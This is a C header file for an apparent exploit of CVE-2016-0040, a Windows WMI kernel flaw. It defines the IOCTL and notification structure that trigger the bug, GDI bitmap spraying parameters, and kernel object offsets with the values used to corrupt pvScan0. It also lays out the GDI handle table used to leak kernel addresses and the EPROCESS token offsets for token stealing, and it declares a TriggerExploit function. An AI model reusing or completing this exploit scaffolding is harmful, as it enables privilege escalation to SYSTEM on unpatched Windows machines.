#ifndef __CVE_2016_0040_LIBRARY_H__
#define __CVE_2016_0040_LIBRARY_H__

#include <windef.h>
#include <winioctl.h>

#define BITS_PER_BYTE 8

#define TRIGGER_VULNERABILITY_RETRIES 1024

#define WMI_RECEIVE_NOTIFICATIONS_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x51, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define WMI_RECEIVE_NOTIFICATION_ACTION_CREATE_THREAD 2
#define WMI_RECEIVE_NOTIFICATION_HANDLE_COUNT 20

#define BITMAP_SIZE (BITMAP_WIDTH * BITMAP_HEIGHT * (BITMAP_BIT_COUNT / BITS_PER_BYTE))
#define BITMAP_WIDTH 0x64
#define BITMAP_HEIGHT 0x64
#define BITMAP_PLANES 1
#define BITMAP_BIT_COUNT 32

#define BITMAP_COUNT 4096
#define BITMAP_MANAGER_INDEX 2048
#define BITMAP_WORKER_INDEX 3072

#define IMAGE_BASE_LIST_SIZE 0x1000
#define IMAGE_BASE_KERNEL_INDEX 0

#define PAGE_FRAME_NUMBER_COUNT 1024 

#define BITMAP_STRUCTURE_CHECK_OFFSET 0x48
#define BITMAP_STRUCTURE_PVSCAN0_OFFSET 0x50
#define BITMAP_STRUCTURE_CORRUPTION_OFFSET 0x80
#define BITMAP_STRUCTURE_CORRUPTION_VALUE_0 0x1000000000006
#define BITMAP_STRUCTURE_CORRUPTION_VALUE_1 0x238

#define RETURN_BUFFER_SIZE 1000

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0
} PROCESSINFOCLASS;

typedef struct _PEB {
	BYTE unk[0xf8];
	VOID *GdiSharedHandleTable;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef struct _WMI_RECEIVE_NOTIFICATION {
	ULONG HandleCount;
	ULONG Action;
	HANDLE UserModeCallback;
	HANDLE UserModeProcess;
	HANDLE Handles[WMI_RECEIVE_NOTIFICATION_HANDLE_COUNT];
} WMI_RECEIVE_NOTIFICATION, *PWMI_RECEIVE_NOTIFICATION;

#pragma pack(push, 1)
typedef struct _GDICELL64 {
	PVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	PVOID pUserAddress;
} GDICELL64;
#pragma pack(pop)

typedef struct EPROCESS_OFFSETS {
	DWORD UniqueProcessId;
	DWORD Token;
} EPROCESS_OFFSETS, *PEPROCESS_OFFSETS;

BOOLEAN TriggerExploit(VOID);

#endif //__CVE_2016_0040_LIBRARY_H__